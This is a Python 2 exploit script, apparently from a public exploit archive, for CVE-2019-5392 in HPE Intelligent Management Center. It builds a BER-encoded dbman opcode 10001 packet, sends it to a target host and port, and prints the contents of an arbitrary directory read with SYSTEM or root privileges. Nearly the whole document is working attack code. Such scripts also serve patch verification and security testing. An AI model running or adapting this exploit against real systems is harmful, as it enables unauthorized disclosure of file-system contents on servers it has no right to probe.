#!/opt/local/bin/python2.7

# Exploit Title: HPE Intelligent Management Center dbman Command 10001 Information Disclosure
# Date: 22-09-2019
# Exploit Author: Rishabh Sharma (Linkedin: rishabh2241991)
# Vendor Homepage: www.hpe.com
# Software Link: https://h10145.www1.hpe.com/Downloads/DownloadSoftware.aspx?SoftwareReleaseUId=16759&ProductNumber=JG747AAE&lang=en&cc=us&prodSeriesId=4176535&SaidNumber=
# Tested on Version: iMC_PLAT_7.1_E0302_Standard_Windows and iMC_PLAT_7.2_E0403_Std_Win
# Tested on: Windows 7
# CVE : CVE-2019-5392
# Conversion of Nessus Plugin to Python Exploit
# Nessus Plugin Name: hp_imc_dbman_cmd_10001_info_disclosure.nasl
# Description: This vulnerability allow remote attacker to view the contents of arbitrary directories under the security context of the SYSTEM or root user.
# See Also: https://www.tenable.com/plugins/nessus/118038

from pyasn1.type.univ import *
from pyasn1.type.namedtype import *
from pyasn1.codec.ber import encoder
import struct
import binascii
import socket, sys
import sys
import re

if len(sys.argv) != 4:
    print "USAGE: python %s <ip> <port> <directory>" % (sys.argv[0])
    sys.exit(1)
else:
    ip = sys.argv[1]
    port = int(sys.argv[2]) # Default Port 2810
    directory = sys.argv[3]
    payload = directory.replace("\\","\\\\") 
    opcode = 10001

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print "Socket Created.."
except socket.error:
	print 'Failed to create socket'
	sys.exit()
victim_address = (ip,port)
print('connecting to {} port {}'.format(*victim_address))
sock.connect((ip, port))

class DbmanMsg(Sequence):
    componentType = NamedTypes(
        NamedType('flag', Integer()),
        NamedType('dir', OctetString())
    )

data = DbmanMsg()
data['flag'] = 1
data['dir'] = payload
encodeddata = encoder.encode(data, defMode=False)
dataLen = len(encodeddata)
values = (opcode, dataLen, encodeddata)
s = struct.Struct(">ii%ds" % dataLen)
packed_data = s.pack(*values)
print 'Format string  :', s.format
print 'Uses           :',s.size, 'bytes'
print 'Packed Value   :', binascii.hexlify(packed_data)
print '\n'
print 'Sending Payload...'
sock.send(packed_data)
BUFF_SIZE = 4000
res = sock.recv(BUFF_SIZE)
rec =  len(res)
if (rec == 0):
	print "No data in the directory"
else:
        print "Data Recived: "+str(rec)
	a = repr(res)
	b = a
	b = re.sub(r'(x\d\d)', '', b)
	b = re.sub(r'(\\x[\d].)', '', b)
	b = re.sub(r'(\\x..)', '', b)
	replacestring = ['"','\\n','\\r','\\t','0']
	print "Data in "+payload+" Directory: \n"
	for r in replacestring:
		b = b.replace(r,'')
	b = b.replace("'","")
	#print b #Remove '#' if output results is not proper
	matches = re.finditer(r"([\\]*)([.[a-zA-Z\d\s]*)", b, re.MULTILINE)
	for matchNum, match in enumerate(matches, start=1):
                
		print match.group(2)
print "Done..."
sock.close()